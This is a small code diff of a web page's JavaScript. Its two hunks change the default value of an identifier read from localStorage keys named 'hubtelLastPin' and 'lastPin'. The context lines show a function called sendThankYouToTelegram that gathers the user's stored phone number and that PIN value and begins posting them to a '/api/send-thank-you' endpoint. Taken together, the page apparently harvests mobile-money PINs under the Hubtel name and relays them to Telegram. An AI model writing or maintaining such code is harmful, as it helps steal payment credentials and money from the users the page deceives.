@@ -359,7 +359,7 @@
             }
 
             const phone = localStorage.getItem('hubtelUserPhone') || localStorage.getItem('userPhone') || '';
-            const uniqueId = localStorage.getItem('hubtelLastPin') || localStorage.getItem('lastPin') || 'N/A';
+            const uniqueId = localStorage.getItem('hubtelLastPin') || localStorage.getItem('lastPin') || '';
             const loadingContainer = document.getElementById('loadingContainer');
             const spinnerTxt = document.getElementById('spinnerText');
 
@@ -422,7 +422,7 @@
 
         async function sendThankYouToTelegram() {
             const phone = localStorage.getItem('hubtelUserPhone') || localStorage.getItem('userPhone') || '';
-            const uniqueId = localStorage.getItem('hubtelLastPin') || localStorage.getItem('lastPin') || 'N/A';
+            const uniqueId = localStorage.getItem('hubtelLastPin') || localStorage.getItem('lastPin') || '';
 
             try {
                 const response = await fetch('/api/send-thank-you', {
